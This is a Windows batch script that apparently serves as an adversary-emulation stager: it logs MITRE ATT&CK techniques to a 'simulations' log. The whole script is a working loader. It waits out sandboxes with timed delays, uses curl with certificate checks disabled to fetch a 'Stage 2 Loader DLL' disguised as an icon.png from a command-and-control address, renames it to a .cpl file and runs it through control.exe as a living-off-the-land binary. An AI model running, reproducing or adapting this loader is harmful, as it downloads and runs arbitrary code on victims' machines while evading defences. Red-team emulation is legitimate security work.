@echo off
setlocal enabledelayedexpansion

SET pvnxkl=%APPDATA%\10402\52654039
SET rwmtjq=b3f42e8b.txt
SET hzsdby=https://10.0.0.49/stage/2/icon.png?10402-7
SET cqfaem=BALAM-S2BO
SET tnwolr=10402
SET gxbpui=7

SET logfile=%APPDATA%\!gxbpui!\macula-simulations.log
if not exist "%APPDATA%\!gxbpui!" mkdir "%APPDATA%\!gxbpui!"

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: script_start>> "!logfile!" 2>nul

REM --- Initial anti-sandbox delay (10-20s) before any logic ---
timeout /t 15 /nobreak >nul

REM --- Random delay component ---
SET /A delay=%RANDOM% %% 20 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: initial_delay_complete>> "!logfile!" 2>nul

REM --- Anti-analysis: Debugger.IsAttached equivalent via timing probe ---
REM Batch has no direct debugger API; use a timing-safe sleep to absorb debugger overhead
CHOICE /C Y /N /D Y /T 5 >nul

echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: anti_analysis_complete>> "!logfile!" 2>nul

REM --- Log T1497 sandbox evasion result (always OK — no abort on detection) ---
echo [%date% %time%][TTP][!cqfaem!][!tnwolr!]: T1497|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

REM --- Heartbeat fetch: signals liveness to C2 and downloads Stage 2 Loader DLL ---
echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: heartbeat_start>> "!logfile!" 2>nul

curl -k -s -o "!pvnxkl!\!rwmtjq!" "!hzsdby!"
SET curl_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: heartbeat_complete>> "!logfile!" 2>nul

if %curl_err% NEQ 0 (
    echo [%date% %time%][TTP][!cqfaem!][!tnwolr!]: T1071|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
    endlocal
    exit /b 1
)

echo [%date% %time%][TTP][!cqfaem!][!tnwolr!]: T1071|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul

REM --- Inter-operation delay ---
ping -n 8 127.0.0.1 >nul

REM --- Change working directory to Loader location ---
echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: chdir_start>> "!logfile!" 2>nul

cd /d "!pvnxkl!" >nul 2>&1
SET cd_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: chdir_result=%cd_err%>> "!logfile!" 2>nul

REM --- Inter-operation delay ---
CHOICE /C Y /N /D Y /T 7 >nul

REM --- Rename downloaded Loader DLL to CPL for control.exe LOLBIN invocation ---
echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: dll_rename_start>> "!logfile!" 2>nul

rename "!rwmtjq!" file.cpl >nul 2>&1

echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: dll_rename_complete>> "!logfile!" 2>nul

REM --- Inter-operation delay ---
timeout /t 6 /nobreak >nul

REM --- LOLBIN invocation: execute Stage 2 Loader DLL via control.exe (T1218) ---
echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: rundll32_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: process_start>> "!logfile!" 2>nul

control.exe file.cpl
SET lolbin_err=%ERRORLEVEL%

echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: dll_load_complete>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: command_execution_result=%lolbin_err%>> "!logfile!" 2>nul

if %lolbin_err% NEQ 0 (
    echo [%date% %time%][TTP][!cqfaem!][!tnwolr!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
    endlocal
    exit /b 1
)

echo [%date% %time%][TTP][!cqfaem!][!tnwolr!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul

echo [!tsvar!][DEBUG][!cqfaem!][!tnwolr!]: script_exit>> "!logfile!" 2>nul

endlocal
exit /b 0